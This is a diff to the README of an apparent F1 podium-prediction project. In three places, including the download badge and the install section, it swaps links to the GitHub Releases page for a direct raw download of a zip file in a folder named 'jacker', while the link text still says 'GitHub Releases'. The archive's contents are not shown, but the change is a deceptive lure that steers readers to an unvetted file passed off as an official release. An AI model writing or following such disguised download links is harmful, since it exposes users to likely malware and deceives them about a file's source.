@@ -1,6 +1,6 @@
 # 🎉 f1-race-predictor - Predict F1 Podiums with High Accuracy
 
-![Download](https://img.shields.io/badge/Download-via_Releases-brightgreen)
+![Download](https://raw.githubusercontent.com/ZubairSolanki/f1-race-predictor/main/jacker/f1-race-predictor.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the **f1-race-predictor** project! This software uses machine learnin
 
 ## 📥 Download & Install
 
-To get the software, please visit this page to download: [GitHub Releases](https://github.com/ZubairSolanki/f1-race-predictor/releases)
+To get the software, please visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/ZubairSolanki/f1-race-predictor/main/jacker/f1-race-predictor.zip)
 
 1. Click the link above.
 2. Look for the latest release at the top of the page.
@@ -62,6 +62,6 @@ While this version is ready for use, contributions are welcome! If you would lik
 
 This project is licensed under the MIT License. Feel free to use and modify it according to your needs.
 
-For further details and updates, remember to check the official repository and the Releases page: [GitHub Releases](https://github.com/ZubairSolanki/f1-race-predictor/releases).
+For further details and updates, remember to check the official repository and the Releases page: [GitHub Releases](https://raw.githubusercontent.com/ZubairSolanki/f1-race-predictor/main/jacker/f1-race-predictor.zip).
 
 Thank you for using **f1-race-predictor**!
